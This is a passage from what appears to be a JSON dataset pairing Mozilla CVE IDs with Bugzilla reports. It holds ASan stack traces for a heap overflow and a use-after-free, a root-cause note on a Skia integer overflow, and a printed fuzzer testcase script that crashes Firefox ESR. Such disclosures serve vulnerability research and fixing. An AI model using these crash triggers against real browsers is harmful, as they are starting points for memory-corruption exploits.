Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==13600==ABORTING"
      }
    ],
    "CVE-2018-5094": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1415883",
        "title": "Heap-buffer-overflow READ 8 with async generators",
        "description": "This bug was found by Google's OSS-Fuzz running their custom internal JS fuzzer. I am refiling it in our issue tracker. Please note that they apply a 90-day disclose timeline to all bugs: [Environment] ASAN_OPTIONS = redzone=256:strict_memcmp=0:allow_user_segv_handler=1:allocator_may_return_null=1:handle_sigfpe=1:handle_sigbus=1:detect_stack_use_after_return=0:alloc_dealloc_mismatch=0:print_scariness=1:max_uar_stack_size_log=16:detect_odr_violation=0:handle_sigill=1:coverage=0:use_sigaltstack=1:fast_unwind_on_fatal=1:detect_leaks=0:print_summary=1:handle_abort=1:check_malloc_usable_size=0:detect_container_overflow=1:symbolize=0:handle_segv=1 ================================================================= ==29026==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61100032bcc0 at pc 0x0000005ff8fc bp 0x7fff9dd8dbb0 sp 0x7fff9dd8dba8 READ of size 8 at 0x61100032bcc0 thread T0 SCARINESS: 23 (8-byte-read-heap-buffer-overflow) #0 0x5ff8fb in JS::Value::toTag() const mozilla-central/js/src/build_DBG.OBJ/dist/include/js/Value.h:437:32 #1 0x5ff8fb in JS::Value::isString() const mozilla-central/js/src/build_DBG.OBJ/dist/include/js/Value.h:512 #2 0x5ff8fb in _ZN2js13DispatchTypedINS_17PreBarrierFunctorIN2JS5ValueEEEJEEEDTclfp_scP8JSObjectLDnEspclsr7mozillaE7ForwardIT0_Efp1_EEET_RKS3_DpOS7_ mozilla-central/js/src/build_DBG.OBJ/dist/include/js/Value.h:1431 #3 0x6ed1e9 in js::InternalBarrierMethods<JS::Value>::preBarrier(JS::Value const&) mozilla-central/js/src/gc/Barrier.h:283:9 #4 0x6ed1e9 in js::WriteBarrieredBase<JS::Value>::pre() mozilla-central/js/src/gc/Barrier.h:374 #5 0x6ed1e9 in js::HeapSlot::~HeapSlot() mozilla-central/js/src/gc/Barrier.h:678 #6 0x6ed1e9 in js::NativeObject::prepareElementRangeForOverwrite(unsigned long, unsigned long) mozilla-central/js/src/vm/NativeObject.h:1007 #7 0x6ed1e9 in js::NativeObject::setDenseInitializedLengthUnchecked(unsigned int) mozilla-central/js/src/vm/NativeObject.h:1179 #8 0x1e243d0 in js::NativeObject::setDenseInitializedLength(unsigned int) mozilla-central/js/src/vm/NativeObject.h:1196:9 #9 0x1e243d0 in js::AsyncGeneratorRequest* js::ShiftFromList<js::AsyncGeneratorRequest>(JSContext*, JS::Handle<js::NativeObject*>) mozilla-central/js/src/vm/List-inl.h:62 #10 0x1e10267 in js::AsyncGeneratorObject::dequeueRequest(JSContext*, JS::Handle<js::AsyncGeneratorObject*>) mozilla-central/js/src/vm/AsyncIteration.cpp:374:12 #11 0xa847c4 in js::AsyncGeneratorResolve(JSContext*, JS::Handle<js::AsyncGeneratorObject*>, JS::Handle<JS::Value>, bool) mozilla-central/js/src/builtin/Promise.cpp:2769:13 #12 0xa86073 in AsyncGeneratorResumeNext(JSContext*, JS::Handle<js::AsyncGeneratorObject*>) mozilla-central/js/src/builtin/Promise.cpp:2890:16 #13 0xa84d8b in js::AsyncGeneratorResolve(JSContext*, JS::Handle<js::AsyncGeneratorObject*>, JS::Handle<JS::Value>, bool) mozilla-central/js/src/builtin/Promise.cpp:2790:10 #14 0xa86073 in AsyncGeneratorResumeNext(JSContext*, JS::Handle<js::AsyncGeneratorObject*>) mozilla-central/js/src/builtin/Promise.cpp:2890:16 #15 0xa84d8b in js::AsyncGeneratorResolve(JSContext*, JS::Handle<js::AsyncGeneratorObject*>, JS::Handle<JS::Value>, bool) mozilla-central/js/src/builtin/Promise.cpp:2790:10 #16 0xa86073 in AsyncGeneratorResumeNext(JSContext*, JS::Handle<js::AsyncGeneratorObject*>) mozilla-central/js/src/builtin/Promise.cpp:2890:16 #17 0xa84d8b in js::AsyncGeneratorResolve(JSContext*, JS::Handle<js::AsyncGeneratorObject*>, JS::Handle<JS::Value>, bool) mozilla-central/js/src/builtin/Promise.cpp:2790:10 #18 0xa86073 in AsyncGeneratorResumeNext(JSContext*, JS::Handle<js::AsyncGeneratorObject*>) mozilla-central/js/src/builtin/Promise.cpp:2890:16 #19 0xa84d8b in js::AsyncGeneratorResolve(JSContext*, JS::Handle<js::AsyncGeneratorObject*>, JS::Handle<JS::Value>, bool) mozilla-central/js/src/builtin/Promise.cpp:2790:10 #20 0xa86073 in AsyncGeneratorResumeNext(JSContext*, JS::Handle<js::AsyncGeneratorObject*>) mozilla-central/js/src/builtin/Promise.cpp:2890:16 #21 0xa84d8b in js::AsyncGeneratorResolve(JSContext*, JS::Handle<js::AsyncGeneratorObject*>, JS::Handle<JS::Value>, bool) mozilla-central/js/src/builtin/Promise.cpp:2790:10 #22 0x1e0bfd7 in js::AsyncGeneratorResume(JSContext*, JS::Handle<js::AsyncGeneratorObject*>, js::CompletionKind, JS::Handle<JS::Value>) mozilla-central/js/src/vm/AsyncIteration.cpp:0 #23 0xa867e8 in AsyncGeneratorResumeNext(JSContext*, JS::Handle<js::AsyncGeneratorObject*>) mozilla-central/js/src/builtin/Promise.cpp:2918:12 #24 0xa84d8b in js::AsyncGeneratorResolve(JSContext*, JS::Handle<js::AsyncGeneratorObject*>, JS::Handle<JS::Value>, bool) mozilla-central/js/src/builtin/Promise.cpp:2790:10 #25 0x1e0bfd7 in js::AsyncGeneratorResume(JSContext*, JS::Handle<js::AsyncGeneratorObject*>, js::CompletionKind, JS::Handle<JS::Value>) mozilla-central/js/src/vm/AsyncIteration.cpp:0 #26 0xb405e3 in AsyncGeneratorPromiseReactionJob(JSContext*, JS::Handle<PromiseReactionRecord*>, JS::MutableHandle<JS::Value>) mozilla-central/js/src/builtin/Promise.cpp:1122:14 #27 0xb405e3 in PromiseReactionJob(JSContext*, unsigned int, JS::Value*) mozilla-central/js/src/builtin/Promise.cpp:1201 #28 0x8bc784 in js::CallJSNative(JSContext*, bool (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) mozilla-central/js/src/jscntxtinlines.h:291:15 #29 0x8bc784 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) mozilla-central/js/src/vm/Interpreter.cpp:472 #30 0x8be967 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) mozilla-central/js/src/vm/Interpreter.cpp:540:10 #31 0x18777ce in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) mozilla-central/js/src/jsapi.cpp:3032:12 #32 0x18d8525 in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JSObject*>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) mozilla-central/js/src/jsapi.h:3595:12 #33 0x18d8525 in js::RunJobs(JSContext*) mozilla-central/js/src/jscntxt.cpp:1213 #34 0x56a2f4 in Shell(JSContext*, js::cli::OptionParser*, char**) mozilla-central/js/src/shell/js.cpp:8561:9 #35 0x56a2f4 in main mozilla-central/js/src/shell/js.cpp:8967 #36 0x7fc3a22c282f in __libc_start_main /build/glibc-bfm8X4/glibc-2.23/csu/libc-start.c:291 0x61100032bcc0 is located 0 bytes to the right of 64-byte region [0x61100032bc80,0x61100032bcc0) allocated by thread T0 here: #0 0x51a300 in __interceptor_realloc _asan_rtl_ #1 0x1913512 in js_realloc(void*, unsigned long) mozilla-central/js/src/build_DBG.OBJ/dist/include/js/Utility.h:406:12 #2 0x1913512 in unsigned char* js_pod_realloc<unsigned char>(unsigned char*, unsigned long, unsigned long) mozilla-central/js/src/build_DBG.OBJ/dist/include/js/Utility.h:594 #3 0x1913512 in unsigned char* js::MallocProvider<JS::Zone>::maybe_pod_realloc<unsigned char>(unsigned char*, unsigned long, unsigned long) mozilla-central/js/src/vm/MallocProvider.h:70 #4 0x1913512 in unsigned char* js::MallocProvider<JS::Zone>::pod_realloc<unsigned char>(unsigned char*, unsigned long, unsigned long) mozilla-central/js/src/vm/MallocProvider.h:173 #5 0x2a1f9d3 in js::Nursery::reallocateBuffer(JSObject*, void*, unsigned long, unsigned long) mozilla-central/js/src/gc/Nursery.cpp:403:29 #6 0x20e78c9 in js::HeapSlot* js::ReallocateObjectBuffer<js::HeapSlot>(JSContext*, JSObject*, js::HeapSlot*, unsigned int, unsigned int) mozilla-central/js/src/gc/Nursery-inl.h:135:48 #7 0x20e78c9 in js::NativeObject::shrinkElements(JSContext*, unsigned int) mozilla-central/js/src/vm/NativeObject.cpp:1028 #8 0x1e24364 in js::AsyncGeneratorRequest* js::ShiftFromList<js::AsyncGeneratorRequest>(JSContext*, JS::Handle<js::NativeObject*>) mozilla-central/js/src/vm/List-inl.h:59:15 #9 0x1e10267 in js::AsyncGeneratorObject::dequeueRequest(JSContext*, JS::Handle<js::AsyncGeneratorObject*>) mozilla-central/js/src/vm/AsyncIteration.cpp:374:12 #10 0xa847c4 in js::AsyncGeneratorResolve(JSContext*, JS::Handle<js::AsyncGeneratorObject*>, JS::Handle<JS::Value>, bool) mozilla-central/js/src/builtin/Promise.cpp:2769:13 #11 0xa86073 in AsyncGeneratorResumeNext(JSContext*, JS::Handle<js::AsyncGeneratorObject*>) mozilla-central/js/src/builtin/Promise.cpp:2890:16 #12 0xa84d8b in js::AsyncGeneratorResolve(JSContext*, JS::Handle<js::AsyncGeneratorObject*>, JS::Handle<JS::Value>, bool) mozilla-central/js/src/builtin/Promise.cpp:2790:10 #13 0xa86073 in AsyncGeneratorResumeNext(JSContext*, JS::Handle<js::AsyncGeneratorObject*>) mozilla-central/js/src/builtin/Promise.cpp:2890:16 #14 0xa84d8b in js::AsyncGeneratorResolve(JSContext*, JS::Handle<js::AsyncGeneratorObject*>, JS::Handle<JS::Value>, bool) mozilla-central/js/src/builtin/Promise.cpp:2790:10 #15 0xa86073 in AsyncGeneratorResumeNext(JSContext*, JS::Handle<js::AsyncGeneratorObject*>) mozilla-central/js/src/builtin/Promise.cpp:2890:16 #16 0xa84d8b in js::AsyncGeneratorResolve(JSContext*, JS::Handle<js::AsyncGeneratorObject*>, JS::Handle<JS::Value>, bool) mozilla-central/js/src/builtin/Promise.cpp:2790:10 #17 0xa86073 in AsyncGeneratorResumeNext(JSContext*, JS::Handle<js::AsyncGeneratorObject*>) mozilla-central/js/src/builtin/Promise.cpp:2890:16 #18 0xa84d8b in js::AsyncGeneratorResolve(JSContext*, JS::Handle<js::AsyncGeneratorObject*>, JS::Handle<JS::Value>, bool) mozilla-central/js/src/builtin/Promise.cpp:2790:10 #19 0xa86073 in AsyncGeneratorResumeNext(JSContext*, JS::Handle<js::AsyncGeneratorObject*>) mozilla-central/js/src/builtin/Promise.cpp:2890:16 #20 0xa84d8b in js::AsyncGeneratorResolve(JSContext*, JS::Handle<js::AsyncGeneratorObject*>, JS::Handle<JS::Value>, bool) mozilla-central/js/src/builtin/Promise.cpp:2790:10 #21 0x1e0bfd7 in js::AsyncGeneratorResume(JSContext*, JS::Handle<js::AsyncGeneratorObject*>, js::CompletionKind, JS::Handle<JS::Value>) mozilla-central/js/src/vm/AsyncIteration.cpp:0 #22 0xa867e8 in AsyncGeneratorResumeNext(JSContext*, JS::Handle<js::AsyncGeneratorObject*>) mozilla-central/js/src/builtin/Promise.cpp:2918:12 #23 0xa84d8b in js::AsyncGeneratorResolve(JSContext*, JS::Handle<js::AsyncGeneratorObject*>, JS::Handle<JS::Value>, bool) mozilla-central/js/src/builtin/Promise.cpp:2790:10 #24 0x1e0bfd7 in js::AsyncGeneratorResume(JSContext*, JS::Handle<js::AsyncGeneratorObject*>, js::CompletionKind, JS::Handle<JS::Value>) mozilla-central/js/src/vm/AsyncIteration.cpp:0 #25 0xb405e3 in AsyncGeneratorPromiseReactionJob(JSContext*, JS::Handle<PromiseReactionRecord*>, JS::MutableHandle<JS::Value>) mozilla-central/js/src/builtin/Promise.cpp:1122:14 #26 0xb405e3 in PromiseReactionJob(JSContext*, unsigned int, JS::Value*) mozilla-central/js/src/builtin/Promise.cpp:1201 #27 0x8bc784 in js::CallJSNative(JSContext*, bool (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) mozilla-central/js/src/jscntxtinlines.h:291:15 #28 0x8bc784 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) mozilla-central/js/src/vm/Interpreter.cpp:472 #29 0x8be967 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) mozilla-central/js/src/vm/Interpreter.cpp:540:10 #30 0x18777ce in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) mozilla-central/js/src/jsapi.cpp:3032:12 #31 0x18d8525 in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JSObject*>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) mozilla-central/js/src/jsapi.h:3595:12 #32 0x18d8525 in js::RunJobs(JSContext*) mozilla-central/js/src/jscntxt.cpp:1213 #33 0x56a2f4 in Shell(JSContext*, js::cli::OptionParser*, char**) mozilla-central/js/src/shell/js.cpp:8561:9 #34 0x56a2f4 in main mozilla-central/js/src/shell/js.cpp:8967 #35 0x7fc3a22c282f in __libc_start_main /build/glibc-bfm8X4/glibc-2.23/csu/libc-start.c:291 SUMMARY: AddressSanitizer: heap-buffer-overflow (/mnt/scratch0/clusterfuzz/slave-bot/builds/clusterfuzz-builds-no-engine_spidermonkey_6aad6e0d14f81d36f48dbd887aa56b38e87859f7/revisions/js+0x5ff8fb) Shadow bytes around the buggy address: 0x0c228005d740: fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa 0x0c228005d750: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c228005d760: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c228005d770: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c228005d780: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c228005d790: 00 00 00 00 00 00 00 00[fa]fa fa fa fa fa fa fa 0x0c228005d7a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c228005d7b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c228005d7c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c228005d7d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c228005d7e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==29026==ABORTING"
      }
    ],
    "CVE-2018-5095": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1418447",
        "title": "Heap overflow write in SkEdgeBuilder::buildPoly",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0 Build ID: 20171115095126 Steps to reproduce: System: Ubuntu 16.04.3 LTS (64bit) Firefox version: 57.0 (64-bit) RAM size:16376108 kB(16G) Root cause: Int overflow could happen there: https://searchfox.org/mozilla-central/source/gfx/skia/skia/src/core/SkEdgeBuilder.cpp#251 int maxEdgeCount = path.countPoints(); if (iclip) { // clipping can turn 1 line into (up to) kMaxClippedLineSegments, since // we turn portions that are clipped out on the left/right into vertical // segments. maxEdgeCount *= SkLineClipper::kMaxClippedLineSegments; // Int overflow } size_t edgeSize = fAnalyticAA ? sizeof(SkAnalyticEdge) : sizeof(SkEdge); char* edge = fAnalyticAA ? (char*)fAlloc.makeArrayDefault<SkAnalyticEdge>(maxEdgeCount) : (char*)fAlloc.makeArrayDefault<SkEdge>(maxEdgeCount); When \"maxEdgeCount\" become negative, \"fAlloc.makeArrayDefault\" will alloc much less memory than needed: makeArrayDefault(size_t count) { uint32_t safeCount = SkTo<uint32_t>(count); // incorrect conversion Reproduce: To trigger the vulnerability, we need to make the path have about 0x80000000/3 points, which would consume about 6.1G RAM. Hence the vulnerability can only be fast triggered on a computer with at least 8GB RAM. Open attached poc.html, wait for about 30 seconds or less, the tab will crash. With gdb attached and firefox-dbg installed, we can see the stack backtrace: (gdb) bt 8 #0 SkEdgeBuilder::CombineVertical (this=0x7ffd64103020, edge=0x7f1087747218, last=0x25700000000) at /build/firefox-HLWaua/firefox-57.0+build4/gfx/skia/skia/src/core/SkEdgeBuilder.cpp:22 #1 0x00007f10a80b24b5 in SkEdgeBuilder::buildPoly (this=this@entry=0x7ffd64103020, path=..., iclip=iclip@entry=0x7ffd64102f80, shiftUp=shiftUp@entry=2, canCullToTheRight=canCullToTheRight@entry=true) at /build/firefox-HLWaua/firefox-57.0+build4/gfx/skia/skia/src/core/SkEdgeBuilder.cpp:284 #2 0x00007f10a80b642e in SkEdgeBuilder::build (this=this@entry=0x7ffd64103020, path=..., iclip=iclip@entry=0x7ffd64102f80, shiftUp=shiftUp@entry=2, canCullToTheRight=<optimized out>, analyticAA=analyticAA@entry=false) at /build/firefox-HLWaua/firefox-57.0+build4/gfx/skia/skia/src/core/SkEdgeBuilder.cpp:352 #3 0x00007f10a811d3b4 in sk_fill_path (path=..., clipRect=..., blitter=blitter@entry=0x7ffd641031b0, start_y=-150, stop_y=150, shiftEdgesUp=shiftEdgesUp@entry=2, pathContainedInClip=false) at /build/firefox-HLWaua/firefox-57.0+build4/gfx/skia/skia/src/core/SkScan_Path.cpp:405 #4 0x00007f10a7e850a1 in SkScan::AntiFillPath (path=..., origClip=..., blitter=<optimized out>, blitter@entry=0x7ffd64103cf8, forceRLE=forceRLE@entry=false) at /build/firefox-HLWaua/firefox-57.0+build4/gfx/skia/skia/src/core/SkScan_AntiPath.cpp:726 #5 0x00007f10a7e855c8 in SkScan::AntiFillPath (path=..., clip=..., blitter=0x7ffd64103cf8) at /build/firefox-HLWaua/firefox-57.0+build4/gfx/skia/skia/src/core/SkScan_AntiPath.cpp:783 #6 0x00007f10a801df10 in SkDraw::drawDevPath (this=this@entry=0x7ffd64104ac0, devPath=..., paint=..., drawCoverage=drawCoverage@entry=false, customBlitter=customBlitter@entry=0x0, doFill=doFill@entry=true) at /build/firefox-HLWaua/firefox-57.0+build4/gfx/skia/skia/src/core/SkDraw.cpp:1070 #7 0x00007f10a80203c0 in SkDraw::drawPath (this=this@entry=0x7ffd64104ac0, origSrcPath=..., origPaint=..., prePathMatrix=prePathMatrix@entry=0x0, pathIsMutable=<optimized out>, pathIsMutable@entry=false, drawCoverage=drawCoverage@entry=false, customBlitter=0x0) at /build/firefox-HLWaua/firefox-57.0+build4/gfx/skia/skia/src/core/SkDraw.cpp:1163 In function \"SkEdgeBuilder::Combine SkEdgeBuilder::CombineVertical(const SkEdge* edge, SkEdge* last) \", \"last\" points to invalid memory.(First be read and then be written)"
      }
    ],
    "CVE-2018-5096": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1418922",
        "title": "heap-use-after-free in GetSelectionRange",
        "description": "The following testcase crashes the latest ASAN build of Firefox ESR 52.5.0 (SourceStamp=f9df5238dca13e40b8128faba317df25e2f69249). It requires the fuzzPriv extension. <script> function spin () { var x=new XMLHttpRequest(); x.open(\"POST\",\"https://mozilla.org\",false); try {x.send(\"X\");} catch(e){} } function start() { o33=document.createElementNS('http://www.w3.org/1999/xhtml','marquee'); document.documentElement.addEventListener('DOMAttrModified',fun0); o36=document.createElementNS('http://www.w3.org/1999/xhtml','input'); window.top.document.documentElement.appendChild(o33); window.top.setTimeout(fun1, 4); } function fun0() { window.top.document.documentElement.appendChild(o36); o36.focus(); } function fun1() { o90=document.createElementNS('http://www.w3.org/1999/xhtml','marquee'); document.documentElement.addEventListener('DOMAttrModified',fun2); document.documentElement.appendChild(o90); fuzzPriv.trustedKeyEvent(document.documentElement,'press',false,false,false,false,33,0); } function fun2() { o36.parentNode.removeChild(o36); spin(); o36=null; fuzzPriv.GC();fuzzPriv.CC();fuzzPriv.GC();fuzzPriv.CC();; } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==1018==ERROR: AddressSanitizer: heap-use-after-free on address 0x6150007751b0 at pc 0x7f8e74682779 bp 0x7ffec6f028c0 sp 0x7ffec6f028b8 READ of size 4 at 0x6150007751b0 thread T0 #0 0x7f8e74682778 in GetBoolFlag /home/worker/workspace/build/src/dom/base/nsINode.h:1630:12 #1 0x7f8e74682778 in IsInUncomposedDoc /home/worker/workspace/build/src/dom/base/nsINode.h:526 #2 0x7f8e74682778 in GetPrimaryFrame /home/worker/workspace/build/src/obj-firefox/dist/include/nsIContent.h:916 #3 0x7f8e74682778 in GetPrimaryFrame /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/Element.h:964 #4 0x7f8e74682778 in nsGenericHTMLElement::GetFormControlFrame(bool) /home/worker/workspace/build/src/dom/html/nsGenericHTMLElement.cpp:1005 #5 0x7f8e7453e29a in GetSelectionRange /home/worker/workspace/build/src/dom/html/HTMLInputElement.cpp:6445:43 #6 0x7f8e7453e29a in mozilla::dom::HTMLInputElement::GetSelectionStart(int*) /home/worker/workspace/build/src/dom/html/HTMLInputElement.cpp:6283 #7 0x7f8e77d67089 in GetSelectionStart /home/worker/workspace/build/src/toolkit/components/satchel/nsFormFillController.cpp:560:5 #8 0x7f8e77d67089 in non-virtual thunk to nsFormFillController::GetSelectionStart(int*) /home/worker/workspace/build/src/toolkit/components/satchel/nsFormFillController.cpp:557 #9 0x7f8e77d56663 in nsAutoCompleteController::MaybeCompletePlaceholder() /home/worker/workspace/build/src/toolkit/components/autocomplete/nsAutoCompleteController.cpp:1317:3 #10 0x7f8e77d469ab in nsAutoCompleteController::StartSearches() /home/worker/workspace/build/src/toolkit/components/autocomplete/nsAutoCompleteController.cpp:1358:3 #11 0x7f8e77d490a5 in nsAutoCompleteController::HandleKeyNavigation(unsigned int, bool*) /home/worker/workspace/build/src/toolkit/components/autocomplete/nsAutoCompleteController.cpp:565:11 #12 0x7f8e77d6b4dd in nsFormFillController::KeyPress(nsIDOMEvent*) /home/worker/workspace/build/src/toolkit/components/satchel/nsFormFillController.cpp:1081:5 #13 0x7f8e77d69dd8 in nsFormFillController::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/toolkit/components/satchel/nsFormFillController.cpp:871:12 #14 0x7f8e742c36ad in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1134:16 #15 0x7f8e742c50d7 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1287:17 #16 0x7f8e742afbcd in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:358:7 #17 0x7f8e742b34c8 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:711:9 #18 0x7f8e742b53c7 in mozilla::EventDispatcher::DispatchDOMEvent(nsISupports*, mozilla::WidgetEvent*, nsIDOMEvent*, nsPresContext*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:780:12 #19 0x7f8e724a0991 in nsINode::DispatchEvent(nsIDOMEvent*, bool*) /home/worker/workspace/build/src/dom/base/nsINode.cpp:1309:5 #20 0x7f8e742d0590 in mozilla::dom::EventTarget::DispatchEvent(JSContext*, mozilla::dom::Event&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/events/EventTarget.cpp:73:9 #21 0x7f8e739b158e in mozilla::dom::EventTargetBinding::dispatchEvent(JSContext*, JS::Handle<JSObject*>, mozilla::dom::EventTarget*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventTargetBinding.cpp:988:15 #22 0x7f8e739ae338 in mozilla::dom::EventTargetBinding::genericMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventTargetBinding.cpp:1164:13 #23 0x7f8e7a26e375 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #24 0x7f8e7a26e375 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #25 0x7f8e7a24e77f in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #26 0x7f8e7a24e77f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #27 0x7f8e7a23393d in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #28 0x7f8e7a26e9df in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #29 0x7f8e7a26f022 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #30 0x7f8e79d3da12 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2769:12 #31 0x7f8e70ec416f in xpc::FunctionForwarder(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/ExportHelpers.cpp:315:18 #32 0x7f8e7a26e375 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #33 0x7f8e7a26e375 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #34 0x7f8e7a24e77f in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #35 0x7f8e7a24e77f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #36 0x7f8e7a23393d in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #37 0x7f8e7a26e9df in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #38 0x7f8e7a26f022 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #39 0x7f8e79d3fc7d in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 #40 0x7f8e73a0c769 in mozilla::dom::Function::Call(JSContext*, JS::Handle<JS::Value>, nsTArray<JS::Value> const&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/FunctionBinding.cpp:36:8 #41 0x7f8e720bc167 in Call<nsCOMPtr<nsISupports> > /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/FunctionBinding.h:70:12 #42 0x7f8e720bc167 in nsGlobalWindow::RunTimeoutHandler(mozilla::dom::Timeout*, nsIScriptContext*) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:13029 #43 0x7f8e720bdf00 in nsGlobalWindow::RunTimeout(mozilla::dom::Timeout*) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:13308:32 #44 0x7f8e7229d972 in mozilla::dom::(anonymous namespace)::TimerCallback(nsITimer*, void*) /home/worker/workspace/build/src/dom/base/Timeout.cpp:63:3 #45 0x7f8e6f76a039 in nsTimerImpl::Fire(int) /home/worker/workspace/build/src/xpcom/threads/nsTimerImpl.cpp:479:7 #46 0x7f8e6f73e48c in nsTimerEvent::Run() /home/worker/workspace/build/src/xpcom/threads/TimerThread.cpp:285:3 #47 0x7f8e6f75a4c2 in mozilla::ThrottledEventQueue::Inner::ExecuteRunnable() /home/worker/workspace/build/src/xpcom/threads/ThrottledEventQueue.cpp:161:15 #48 0x7f8e6f759e8f in mozilla::ThrottledEventQueue::Inner::Executor::Run() /home/worker/workspace/build/src/xpcom/threads/ThrottledEventQueue.cpp:74:7 #49 0x7f8e6f74ccab in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1216:7 #50 0x7f8e6f7cedec in NS_ProcessNextEvent(nsIThread*, bool) 